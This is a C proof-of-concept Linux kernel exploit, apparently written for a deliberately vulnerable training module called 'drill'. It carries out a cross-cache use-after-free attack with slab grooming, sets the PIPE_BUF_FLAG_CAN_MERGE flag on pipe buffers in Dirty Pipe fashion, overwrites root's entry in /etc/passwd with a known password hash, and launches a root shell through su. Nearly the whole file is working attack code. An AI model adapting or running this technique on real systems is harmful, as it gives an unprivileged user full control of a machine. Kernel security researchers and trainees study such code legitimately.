/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Currently, this PoC performs the Dirty Pipe attack for LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
 *  - perform uaf write using the dangling reference
 *  - execute the exploit primitive via the overwritten target object
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

/*
 * Use the slab cache with objects of size (N * sizeof(struct pipe_buffer)),
 * which is (N * 40) bytes.
 */
#define N		2
#define PIPES_N		OBJS_PER_SLAB * 8
int pipe_fds[PIPES_N][2];

#define PIPE_BUF_FLAG_CAN_MERGE	0x10

/* Write to /etc/passwd after the "root" word at the beginning of the file */
#define FILE_OFFSET	4
int file_fd = 0;

int prepare_pipes(void)
{
	int ret = 0;
	FILE *file_s;
	FILE *file_bkp_s;
	char c;
	long i = 0;

	file_s = fopen("/etc/passwd", "r");
	if (file_s == NULL) {
		perror("[-] fopen 1");
		return EXIT_FAILURE;
	}

	file_bkp_s = fopen("/tmp/passwd.bkp", "w");
	if (file_bkp_s == NULL) {
		perror("[-] fopen 2");
		return EXIT_FAILURE;
	}

	while ((c = fgetc(file_s)) != EOF)
		fputc(c, file_bkp_s);
	printf("[+] /etc/passwd saved to /tmp/passwd.bkp\n");

	fclose(file_s);
	fclose(file_bkp_s);

	file_fd = open("/etc/passwd", O_RDONLY);
	if (file_fd < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (i = 0; i < PIPES_N; i++) {
		ret = pipe(pipe_fds[i]); /* This allocates kmalloc-1k object */
		if (ret < 0) {
			perror("[-] pipe");
			return EXIT_FAILURE;
		}
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	ssize_t bytes = 0;
	/* The hash generaged with `openssl passwd -1 -salt root pwn` */
	char *pwd = "$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
	size_t pwd_len = strlen(pwd);
	char *argv[] = {
		"/bin/sh",
		"-c",
		"(echo pwn; cat) | su -l -c \"id; cp -v /tmp/passwd.bkp /etc/passwd; id; /bin/sh\"",
		NULL
	};

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = prepare_pipes();
	if (ret == EXIT_FAILURE)
		goto end;

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go spraying\n");

	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
	for (i = 0; i < PIPES_N; i++) {
		loff_t file_offset = FILE_OFFSET;

		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
		if (ret != PAGE_SIZE * N) {
			perror("[-] fcntl");
			goto end;
		}

		/* N.B. splice modifies the file_offset value, so we reset it on each loop iteration */
		bytes = splice(file_fd, &file_offset, pipe_fds[i][1], NULL, 1, 0);
		if (bytes < 0) {
			perror("[-] splice");
			goto end;
		}
		if (bytes == 0) {
			perror("[-] splice short");
			goto end;
		}
	}

	printf("[!] perform uaf write using the dangling reference\n");
	/*
	 * Overwrite pipe_buffer flags:
	 *  - flags in pipe_buffer are at the offset 24;
	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
	 */
	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(PIPE_BUF_FLAG_CAN_MERGE) " 8");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[!] execute the exploit primitive via the overwritten target object\n");
	for (i = 0; i < PIPES_N; i++) {
		/*
		 * The following write will not create a new pipe_buffer, but
		 * will instead write into the page cache, because of the
		 * PIPE_BUF_FLAG_CAN_MERGE flag.
		 */
		bytes = write(pipe_fds[i][1], pwd, pwd_len);
		if (bytes < 0) {
			perror("[-] write");
			goto end;
		}
		if (bytes < pwd_len) {
			perror("[-] write short");
			goto end;
		}

	}
	printf("[+] wrote to pipes, now try to run the root shell\n");

	execv("/bin/sh", argv); /* This should not return */
	perror("[-] execv");

end:
	printf("[!] finishing this PoC exploit\n");

	for (i = 0; i < PIPES_N; i++) {
		if (pipe_fds[i][0] >= 0) {
			ret = close(pipe_fds[i][0]);
			if (ret != 0)
				perror("[-] close pipe");
		}
		if (pipe_fds[i][1] >= 0) {
			ret = close(pipe_fds[i][1]);
			if (ret != 0)
				perror("[-] close pipe");
		}
	}

	if (file_fd >= 0) {
		ret = close(file_fd);
		if (ret != 0)
			perror("[-] close file_fd");
		printf("  closed the file_fd\n");
	}

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
		printf("  closed the drill_act fd\n");
	}

	return ret;
}
